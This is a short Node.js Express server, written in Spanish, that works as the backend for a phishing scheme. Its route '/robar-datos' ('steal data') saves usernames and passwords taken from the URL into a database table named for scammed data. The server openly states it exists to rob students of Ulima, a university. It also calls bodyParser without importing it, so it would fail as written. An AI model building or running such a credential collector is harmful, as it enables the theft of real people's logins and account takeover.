import express from 'express';
import cors from 'cors';
import { sequelize } from './database/database.js';
import { DatosScameados } from './models/DatosScameados.js';


const app = express();
app.use(express.json());
app.use(cors());
const port =  process.env.PORT || 3000;

app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json())

async function dbConnection() {
    try {
        await sequelize.authenticate();
        await sequelize.sync( { force: false });
        console.log("Conexion exitosa");
    } catch (error) {
        console.log("Error en la conexion");
    }
}

app.get('/robar-datos/:username/:password', async (req, res) => {
  try {
    let username = req.params.username;
    let password = req.params.password;

    await DatosScameados.create({
      username: username,
      password: password,
    });

    res.send(`Usuario robado satisfactoriamente`);
  } catch (error) {
    console.error("Error al crear usuario:", error);
    res.status(500).send("Ha ocurrido un error al crear el usuario.");
  }
});


app.get('/', (req, res) => {
  res.send('¡Hola! Esta es la API para robar a los estudiantes de la Ulima :)');
});

app.listen(port, () => {
  console.log(`Servidor escuchando en http://localhost:${port}`);
    dbConnection();
});
